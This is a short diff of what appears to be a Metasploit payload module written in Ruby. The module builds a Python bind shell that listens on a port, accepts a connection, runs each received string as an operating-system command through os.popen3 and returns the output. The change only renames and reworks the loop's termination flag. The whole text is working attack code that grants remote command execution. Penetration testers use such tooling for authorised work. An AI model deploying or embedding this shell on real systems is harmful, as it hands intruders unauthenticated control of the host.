@@ -44,16 +44,16 @@ module Metasploit3
   #
   def command_string
     cmd = ''
-    dead = Rex::Text.rand_text_alpha(2)
-    # Set up the socket
+    not_dead = Rex::Text.rand_text_alpha(3)
     cmd << "import socket,os\n"
     cmd << "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
     cmd << "s.bind(('',#{ datastore['LPORT']}))\n"
     cmd << "s.listen(1)\n"
     cmd << "(c,a)=s.accept()\n"
-    cmd << "while not #{dead}:\n"
+    cmd << "#{not_dead}=True\n"
+    cmd << "while #{not_dead}:\n"
     cmd << "\td=c.recv(1024)\n"
-    cmd << "\tif len(d)==0:\n\t\t#{dead}=True\n"
+    cmd << "\tif len(d)==0:\n\t\t#{not_dead}=False\n"
     cmd << "\tsi,so,se,=os.popen3(d)\n"
     cmd << "\tv=so.read()+se.read()\n"
     cmd << "\tc.send(v)\n"
